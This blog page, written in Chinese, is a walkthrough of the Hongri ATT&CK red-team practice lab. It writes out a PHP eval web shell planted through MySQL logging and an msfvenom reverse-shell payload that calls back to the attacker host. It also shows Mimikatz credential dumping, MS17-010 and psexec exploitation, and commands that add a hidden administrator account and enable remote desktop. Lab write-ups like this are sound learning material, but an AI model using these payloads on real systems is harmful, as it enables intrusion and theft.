@@ -1,0 +1,418 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>ATT&amp;CK红队评估(一) | Fjgrsd</title>
+        <meta name="author" content="fjgrsd">
+        <meta name="description" content="learn for happy">
+        <meta name="keywords" content="">
+        <link rel="icon" href="picture_box/headico.png">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">fjgrsd</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;about</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;tags</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;fjgrsd</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
+                </div>
+            </a>
+            
+            <a href="about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
+                </div>
+            </a>
+            
+            <a href="archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
+                </div>
+            </a>
+            
+            <a href="categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
+                </div>
+            </a>
+            
+            <a href="tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+<div class="article">
+    <div>
+        <h1>ATT&amp;CK红队评估(一) </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/9/25
+        </span>
+        
+        <span class="category">
+            <a href="/categories/内网渗透/">
+                <span class="icon">
+                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
+                </span>
+                内网渗透
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/靶机/" style="color: #00a596">
+                    靶机
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="ATT-amp-CK红队评估-一"><a href="#ATT-amp-CK红队评估-一" class="headerlink" title="ATT&amp;CK红队评估(一)"></a>ATT&amp;CK红队评估(一)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参照大佬视频下载安装：</p>
+<p>【红日ATT＆CK系列靶场（一）搭建】 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV13W4y1t7qB?share_source=copy_web&amp;vd_source=953a39e871c2f1959f21d1d3fd3e4985">https://www.bilibili.com/video/BV13W4y1t7qB?share_source=copy_web&amp;vd_source=953a39e871c2f1959f21d1d3fd3e4985</a></p>
+<p>大佬附带了wp</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ta411R7hm/?spm_id_from=333.788.video.desc.click&amp;vd_source=95c8c6a39691f8ad61b1fd78256812c8">https://www.bilibili.com/video/BV1Ta411R7hm/?spm_id_from=333.788.video.desc.click&amp;vd_source=95c8c6a39691f8ad61b1fd78256812c8</a></p>
+<span id="more"></span>
+
+<h3 id="环境详情"><a href="#环境详情" class="headerlink" title="环境详情"></a>环境详情</h3><p>kali攻击机：192.168.1.40</p>
+<p>win7服务器：192.168.1.18和192.168.52.143</p>
+<p>win2008：192.168.52.138</p>
+<p>win2003：192.168.52.141</p>
+<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="看wp前"><a href="#看wp前" class="headerlink" title="看wp前"></a>看wp前</h4><p>先用nmap扫一下目标服务器</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902162750847.png" alt="image-20220902162750847"></p>
+<p>看到开放了80和3306。详细信息如图。先打开浏览器看看80端口</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902163118502.png" alt="image-20220902163118502"></p>
+<p>一个phpstudy探针的页面。尝试从phpstudy入手，上网查些资料，发现存在探针提权的漏洞。</p>
+<p>先测试数据库连接，尝试使用默认账户密码：root root，测试连接成功</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902163544257.png" alt="image-20220902163544257"></p>
+<p>使用账户密码登入phpadmin界面</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902163659262.png" alt="image-20220902163659262"></p>
+<p>在mysql下输入SQL语句运行写入shell</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902164855527.png" alt="image-20220902164855527"></p>
+<pre><code>Drop TABLE IF EXISTS 菜刀连接密码;
+Create TABLE 自定义一个表名(cmd text NOT NULL);
+Insert INTO 自定义一个表名 (cmd) VALUES(&#39;&lt;?php @eval($_POST[菜刀连接密码])?&gt;&#39;);
+Select cmd from 自己编写 into outfile &#39;D:/WWW/菜刀连接地址.php&#39;;[&#39;左边绝对地址需要根据网页自行更改&#39;]
+</code></pre>
+<p>结果提示在导出时由于–secure-file-priv选项失败 ，查看一下</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902165358457.png" alt="image-20220902165358457"></p>
+<pre><code>show global variables like &#39;%secure_file_priv%&#39;;
+# 此开关默认为NULL：即不允许导入导出
+# 没有具体值时：表示不对mysqld 的导入|导出做限制
+# 值为/tmp/ ：表示限制mysqld 的导入|导出只能发生在/tmp/目录下
+</code></pre>
+<p>然后上网查了一下该如何绕过：通过日志写入shell</p>
+<p>找到变量general_log、general_log_file，然后general_log改成ON、general_log_file改为网站根目录下的文件名。</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902170408173.png" alt="image-20220902170408173"></p>
+<p>然后执行select ‘<?php  eval($_POST[pass]);?>‘;再拿蚁剑连接即可拿到shell</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902171026421.png" alt="image-20220902171026421"></p>
+<h4 id="看wp学习"><a href="#看wp学习" class="headerlink" title="看wp学习"></a>看wp学习</h4><p>进入数据库后，看左侧数据库</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914105009821.png" alt="image-20220914105009821"></p>
+<p>有个newyxcms，很明显不是系统数据库，猜测可能有web服务没扫到，猜测网站</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.123.137/yxcms/">http://192.168.123.137/yxcms/</a></p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914105235193.png" alt="image-20220914105235193">在公告信息提示了后台地址和密码，访问</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914105341879.png" alt="image-20220914105341879"></p>
+<p>打开前台模板，管理模板文件</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914105424846.png" alt="image-20220914105424846"></p>
+<p>新建一个模板文件404.php，然后写入马</p>
+<p>下面就是查找到模板文件所在路径，然后访问连马即可</p>
+<p>根据管理首页提供的版本，下载源码YxcmsApp 1.2.1 </p>
+<p>源码一直未找到，查找相关代码审计：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11008%E5%BE%97%E7%9F%A5%E8%B7%AF%E5%BE%84%EF%BC%9Ahttp://192.168.123.137/yxcms/protected/apps/default/view/default/404.php">https://xz.aliyun.com/t/11008得知路径：http://192.168.123.137/yxcms/protected/apps/default/view/default/404.php</a></p>
+<p>哥斯拉连马，上传大马，运行反弹shell到viper</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914112351389.png" alt="image-20220914112351389"></p>
+<p>然后设好路由，传msf马，上线msf</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914132257874.png" alt="image-20220914132257874"></p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="看wp前-1"><a href="#看wp前-1" class="headerlink" title="看wp前"></a>看wp前</h4><p>查看一下，是adminstrator</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902171519745.png" alt="image-20220902171519745"></p>
+<p>看看桌面</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902171610018.png" alt="image-20220902171610018"></p>
+<p>有nmap</p>
+<p>看看ip</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902171710676.png" alt="image-20220902171710676"></p>
+<p>有个192.168.52.143的内网ip，用nmap扫描内网</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902171930027.png" alt="image-20220902171930027"></p>
+<p>我们看到局域网内还有两个主机：192.168.52.138和192.168.52.141两个存活主机。</p>
+<p>我们先看一下192.168.52.138</p>
+<h5 id="上线msf并配置路由和代理"><a href="#上线msf并配置路由和代理" class="headerlink" title="上线msf并配置路由和代理"></a>上线msf并配置路由和代理</h5><p>打开msf，运行：</p>
+<pre><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.40  LPORT=6666 -f exe -o /home/kali/Desktop/a.exe
+</code></pre>
+<p>生成木马，通过蚁剑传入。</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902180231100.png" alt="image-20220902180231100"></p>
+<p>msf使用监听模块：use exploit&#x2F;multi&#x2F;handler</p>
+<p>set lhost 192.168.1.40</p>
+<p>set lport 6666</p>
+<p>run</p>
+<p>然后利用蚁剑shell执行木马a.exe</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902180407211.png" alt="image-20220902180407211"></p>
+<p>上线成功</p>
+<p>在meterpreter下执行run post&#x2F;multi&#x2F;manage&#x2F;autoroute自动配置路由</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902180537723.png" alt="image-20220902180537723"></p>
+<p>或者可以在msf下手动配置路由</p>
+<pre><code>#添加指定路由，1是接收的session编号
+ msf6 &gt; route add 192.168.10.0 255.255.255.0 
+</code></pre>
+<p>在msf下运行route查看路由表</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902180723963.png" alt="image-20220902180723963"></p>
+<p>此时仅msf可以走代理，我们再配置一下socks代理</p>
+<p>msf下运行如下代码：</p>
+<pre><code>use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1  #或者默认0.0.0.0
+show options  #查看配置，默认端口是1080
+run
+</code></pre>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902181005830.png" alt="image-20220902181005830"></p>
+<p>再配置一下proxychains：</p>
+<p> sudo gedit &#x2F;etc&#x2F;proxychains4.conf</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902181201107.png" alt="image-20220902181201107"></p>
+<p>即可使用proxychains代理访问内网</p>
+<h5 id="192-168-52-138"><a href="#192-168-52-138" class="headerlink" title="192.168.52.138"></a>192.168.52.138</h5><p>nmap扫描一下</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902182211003.png" alt="image-20220902182211003"></p>
+<p>目标可能是Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008</p>
+<p>emmm先从80端口下手吧。</p>
+<p>问题就来了，我们怎么浏览器访问80端口呢？很明显我们需要将当前服务器变成我们的代理。参见上文</p>
+<p>访问一下</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902181418900.png" alt="image-20220902181418900"></p>
+<p>是一个IIS7的界面</p>
+<p>百度百科：</p>
+<p>IIS(Internet Information Services)7 指 Windows Server 2008、Windows Server 2008 R2、Windows Vista 和 Windows 7 的某些版本中包含的 IIS 版本。IIS 7.0 在 Windows Server 2008 中是 Web 服务器 (IIS) 角色，而在 Windows Vista 中是 Web 服务器。</p>
+<p>可能是7.0或7.5</p>
+<p>查查资料</p>
+<h6 id="MS15-034漏洞"><a href="#MS15-034漏洞" class="headerlink" title="MS15-034漏洞"></a>MS15-034漏洞</h6><p>远程执行代码漏洞存在于 HTTP 协议堆栈 HTTP.sys中，Http.sys是Microsoft Windows处理HTTP请求的内核驱动程序。当 HTTP.sys 错误解析经特殊构造的 HTTP 请求时会导致此漏洞。</p>
+<p>成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。此漏洞并不是针对IIS的，而是针对Windows操作系统的，主要影响了包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内的主流服务器操作系统。</p>
+<p>在数据包请求头加：</p>
+<pre><code>Range: bytes=0-18446744073709551615
+</code></pre>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902183148363.png" alt="image-20220902183148363"></p>
+<p>得到416 Requested Range Not Satisfiable，表示存在HTTP.SYS远程代码执行漏洞</p>
+<p>使用msf进行攻击</p>
+<p>search ms15-034</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902185250069.png" alt="image-20220902185250069"></p>
+<p>第一个是dos攻击模块，第二个是服务器内存泄漏脚本，我们选择第二个，设置好信息后执行</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902185148499.png" alt="image-20220902185148499"></p>
+<p>dos模块也是如此设置，运行。结果如下：</p>
+<p>被迫自动重启</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902193344114.png" alt="image-20220902193344114"></p>
+<p>但我想要的是shell啊</p>
+<h5 id="192-168-52-141"><a href="#192-168-52-141" class="headerlink" title="192.168.52.141"></a>192.168.52.141</h5><p>nmap扫一下</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902193513921.png" alt="image-20220902193513921"></p>
+<p>开启了ftp服务，系统可能是 Microsoft Windows XP Professional SP2 or Windows Server 2003</p>
+<p>尝试ms08-067，失败，但识别出是windows 2003 sp0</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220902194250807.png" alt="image-20220902194250807"></p>
+<h4 id="看wp学习-1"><a href="#看wp学习-1" class="headerlink" title="看wp学习"></a>看wp学习</h4><p>进入shell</p>
+<p>查看工作组</p>
+<p>net config workstation</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914141536679.png" alt="image-20220914141536679"></p>
+<p>得到工作域名：god.org</p>
+<p>查找域控</p>
+<p>net time &#x2F;domain</p>
+<p>查到域控是owa.god.org</p>
+<p>ping 一下得到ip：192.168.52.138</p>
+<p>查看域内主机</p>
+<p>net view</p>
+<p>得到两个其它主机名，ping一下得到另一个ip：192.168.52.141</p>
+<p>exit退出shell，运行hashdump抓取本机密码</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914141907740.png" alt="image-20220914141907740"></p>
+<p>执行load kiwi引入模块</p>
+<p>执行getsystem进入系统权限</p>
+<p>执行 creds_kerberos抓取域内密码</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914142035086.png" alt="image-20220914142035086"></p>
+<p>得到一个用户，域，密码：Administrator  GOD.ORG  hongrisec@2022</p>
+<p>如果有cs的话此时可以用令牌直接拿下域控。</p>
+<p>进入shell，执行net group “domain admins” &#x2F;domain查看域管理员</p>
+<p>此账户密码就是域管理员的</p>
+<p>退出shell，执行ps查看进程</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914142318567.png" alt="image-20220914142318567"></p>
+<p>选择一个进程偷取令牌以获得管理员权限，这里选择httpd进程执行migrate 3020</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914142417429.png" alt="image-20220914142417429"></p>
+<p>成功得到管理员权限</p>
+<p>拿到管理员权限后可以访问域内所有主机的文件：</p>
+<p>进入shell，执行“\\主机名\c$”查看指定主机的c盘</p>
+<p>现在我们想要上线那两台主机</p>
+<p>执行run post&#x2F;multi&#x2F;manage&#x2F;autoroute配置路由</p>
+<p>退出shell，background暂时离开监听</p>
+<p>执行use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</p>
+<p>设置相关参数：</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914143644884.png" alt="image-20220914143644884"></p>
+<p>exploit执行，爆破用户名密码</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220914144601807.png" alt="image-20220914144601807"></p>
+<p>失败，设上代理试试set Proxies socks5:127.0.0.1:60002</p>
+<p>还是不行</p>
+<p>上传fscan然后扫描</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921111741392.png" alt="image-20220921111741392"></p>
+<h5 id="192-168-52-138-1"><a href="#192-168-52-138-1" class="headerlink" title="192.168.52.138"></a>192.168.52.138</h5><p>一个发现ms17-010可能存在。</p>
+<p>exit，background返回，</p>
+<p>在kali上启动msf，search ms17-010，use 0，设置rhost。</p>
+<p>设置代理：set Proxies socks5:vps-ip:代理端口</p>
+<p>run分别测试。由于payload仅支持64位，所以只有138一台主机可以打通</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921114528668.png" alt="image-20220921114528668"></p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921113726209.png" alt="image-20220921113726209"></p>
+<p>192.168.52.138拿下</p>
+<h5 id="192-168-52-141-1"><a href="#192-168-52-141-1" class="headerlink" title="192.168.52.141"></a>192.168.52.141</h5><p>可以尝试一下ms17-010通杀版本</p>
+<p>search ms17-010，use 2</p>
+<p>设置rhost，commond。</p>
+<p>commond设置如下命令并执行，思路是创建一个用户然后设为管理员权限，最后再远程桌面登录</p>
+<pre><code class="text">// 新增test用户
+set COMMAND net user test Admin123456 /add
+set rhosts 192.168.52.141
+run 
+//将test用户添加到管理员组中
+set COMMAND net localgroup administrators test /add
+run
+//查看管理员组用户名
+set command net localgroup administrators
+run
+</code></pre>
+<p>commond设置成修改注册表打开远程桌面的命令：</p>
+<p>set command ‘REG ADD HKLM\SYSTEM\CurrentControlSet\control\Terminal””Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f’</p>
+<p>然后进入刚才拿的session，添加路由：</p>
+<p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p>
+<p>然后background，运行payload</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921124257465.png" alt="image-20220921124257465"></p>
+<p>运行成功，现在尝试连接远程桌面</p>
+<p>先配置好proxychains的代理，然后运行：</p>
+<p>proxychains4 rdesktop 192.168.52.141 -p Admin123456 -u test</p>
+<p>连接成功</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921124641848.png" alt="image-20220921124641848"></p>
+<p>问题来了，该怎么上线？</p>
+<p>这里参考了师傅的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/adsry/p/15039414.html">https://www.cnblogs.com/adsry/p/15039414.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/483377292">https://zhuanlan.zhihu.com/p/483377292</a></p>
+<p>先扫描管道：</p>
+<p>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;pipe_auditor</p>
+<p>set rhost 192.168.52.141</p>
+<p>set threads 20</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921125459899.png" alt="image-20220921125459899"></p>
+<p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</p>
+<p>设置参数：</p>
+<p><img src="/2022/09/26/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80/image-20220921130541863.png" alt="image-20220921130541863"></p>
+<p>运行即可	&#x2F;&#x2F;可能是配置原因一直连不上</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46635165/article/details/120929567">https://blog.csdn.net/qq_46635165/article/details/120929567</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39581995/article/details/111653204">https://blog.csdn.net/weixin_39581995/article/details/111653204</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0daybug/p/13889731.html">https://www.cnblogs.com/0daybug/p/13889731.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/GBJrBB6GJ0/">https://www.shuzhiduo.com/A/GBJrBB6GJ0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35224240/article/details/116015660">https://blog.csdn.net/qq_35224240/article/details/116015660</a></p>
+
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 20xx - 2022 fjgrsd
+            <span class="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            @fjgrsd
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
+        
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+    </body>
+</html>
